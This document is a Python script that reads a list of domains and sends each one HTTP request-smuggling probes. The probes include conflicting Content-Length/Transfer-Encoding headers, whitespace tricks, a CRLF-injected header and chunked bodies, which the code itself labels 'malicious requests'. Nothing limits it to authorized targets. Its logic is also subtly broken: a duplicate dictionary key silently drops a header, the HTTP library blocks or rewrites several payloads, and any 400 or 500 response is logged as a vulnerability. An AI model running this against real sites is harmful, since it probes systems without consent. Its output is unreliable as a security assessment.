import requests
from requests.exceptions import RequestException
import argparse

# Load domains from the input file
def load_domains(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f.readlines() if line.strip()]

# Log potential vulnerabilities for basic checks
def log_basic_vulnerability(domain, status_code, response_text):
    with open('request_smuggling_basic.log', 'a') as log:
        log.write(f"Potential vulnerability detected at {domain}\n")
        log.write(f"Status Code: {status_code}, Response: {response_text}\n")
        log.write("-" * 40 + "\n")

# Log potential vulnerabilities for advanced checks
def log_advanced_vulnerability(domain, status_code, response_text):
    with open('request_smuggling_advanced.log', 'a') as log:
        log.write(f"Potential vulnerability detected at {domain}\n")
        log.write(f"Status Code: {status_code}, Response: {response_text}\n")
        log.write("-" * 40 + "\n")

# Basic check function for request smuggling
def basic_check(domain, proxies):
    try:
        response = requests.get(f"http://{domain}", timeout=5, proxies=proxies)
        if response.status_code in [400, 500]:
            print(f"Basic check detected potential vulnerability at {domain}: status {response.status_code}.")
            log_basic_vulnerability(domain, response.status_code, response.text)
        else:
            print(f"No vulnerability detected at {domain} in basic check (status: {response.status_code}).")
    except RequestException as e:
        print(f"Error during basic check for {domain}: {e}")

# Craft malicious requests for advanced testing
def advanced_check(domain, proxies):
    # Define payloads based on the techniques discussed
    payloads = [
        # White Space Characters
        {
            'method': 'POST',
            'url': domain,
            'headers': {
                'Content-Length ': '100',
                'Transfer-Encoding': ' chunked'
            },
            'body': '0\r\n\r\n'  # Ending chunk
        },
        # Incorrect Prioritization
        {
            'method': 'POST',
            'url': domain,
            'headers': {
                'Content-Length': '10',
                'Transfer-Encoding': 'chunked'
            },
            'body': '0\r\n\r\n'  # Ending chunk
        },
        # Multiple Headers
        {
            'method': 'POST',
            'url': domain,
            'headers': {
                'Content-Length': '10',
                'Transfer-Encoding': 'chunked',
                'Transfer-Encoding': 'chunked'
            },
            'body': '0\r\n\r\n'  # Ending chunk
        },
        # Ignoring CL/TE Headers
        {
            'method': 'POST',
            'url': domain,
            'headers': {
                'Content-Length': '50'
            },
            'body': 'Some request body that should be ignored.'
        },
        # Not Closing Connection
        {
            'method': 'POST',
            'url': domain,
            'headers': {
                'Content-Length': '20'
            },
            'body': 'A request with a body that is too long.'
        },
        # CRLF Injection
        {
            'method': 'POST',
            'url': domain,
            'headers': {
                'Content-Length': '0\r\nX-Foo: Bar\r\n'
            },
            'body': ''
        },
        # Chunk Extensions
        {
            'method': 'POST',
            'url': domain,
            'headers': {
                'Transfer-Encoding': 'chunked'
            },
            'body': '5;foo\r\nHello\r\n0\r\n\r\n'
        },
        # Trailer Headers
        {
            'method': 'POST',
            'url': domain,
            'headers': {
                'Transfer-Encoding': 'chunked'
            },
            'body': '4\r\nWiki\r\n5\r\nPedia\r\n0\r\n\r\n'  # Chunk with trailer
        },
    ]

    for payload in payloads:
        try:
            response = requests.request(
                method=payload['method'],
                url=f"http://{domain}",  # Ensure http prefix
                headers=payload['headers'],
                data=payload['body'],
                timeout=5,  # Set timeout for the request
                proxies=proxies  # Use proxy if provided
            )
            print(f"Testing {domain}: {response.status_code}, Response: {response.text}")

            # Log if we detect potential vulnerabilities
            if response.status_code in [400, 500]:
                log_advanced_vulnerability(domain, response.status_code, response.text)

        except RequestException as e:
            print(f"Error with {domain}: {e}")

# Main function to run tests
def main():
    parser = argparse.ArgumentParser(description="Check for request smuggling vulnerabilities.")
    parser.add_argument('--file', type=str, default='live_subdomains.txt', help='Input file with domains to test')
    parser.add_argument('--port', type=int, help='Proxy port (optional)', default=None)

    args = parser.parse_args()

    proxies = None
    if args.port:
        proxies = {
            'http': f'http://localhost:{args.port}',
            'https': f'http://localhost:{args.port}',
        }
        print(f"Using proxy on port {args.port} for requests...")

    domains = load_domains(args.file)
    for domain in domains:
        # Perform basic check first
        basic_check(domain, proxies)
        # Then perform advanced request smuggling tests
        advanced_check(domain, proxies)

if __name__ == "__main__":
    main()
